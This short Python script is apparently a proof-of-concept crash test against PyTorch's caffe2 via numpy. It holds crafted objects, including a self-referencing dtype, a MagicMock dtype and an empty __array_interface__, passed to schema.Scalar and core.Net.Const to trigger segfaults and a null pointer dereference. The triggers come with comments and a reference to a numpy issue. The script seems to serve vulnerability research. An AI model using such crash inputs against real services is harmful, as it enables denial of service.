from caffe2.python import schema
from caffe2.python import core
import torch
from unittest.mock import MagicMock
import numpy as np
print(torch.__version__)
print(np.__version__)

import os
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3' 

# print("Vulnerable function triggering - Stack overflow/Infinite Recursion in PyTorch through numpy.dtype")
# schema.Scalar(dtype = MagicMock())  #Segmentation fault
# print("Failed to trigger") #Does not reach


#Managed to crash - success
# https://github.com/numpy/numpy/issues/12751 
# print("Asdf")

# class exploit(object):
#     @property
#     def dtype(self):
#         return self
# x = exploit()
# print("Vulnerable function triggering")
# schema.Scalar(x) #Segmentation fault
# print("Failed to trigger") #Does not reach


# schema.from_dtype(x)
# print("fail")

## Numpy.array - Null Pointer Dereference PyTorch example 
print("Vulnerable function triggering - Null pointer dereference in PyTorch through numpy.array")

class exploitnparray:
    __array_interface__ = {}
t = exploitnparray()

core.Net.Const([t], [t]) #Null pointer dereference
print('Failed to exploit') #Unreachable code
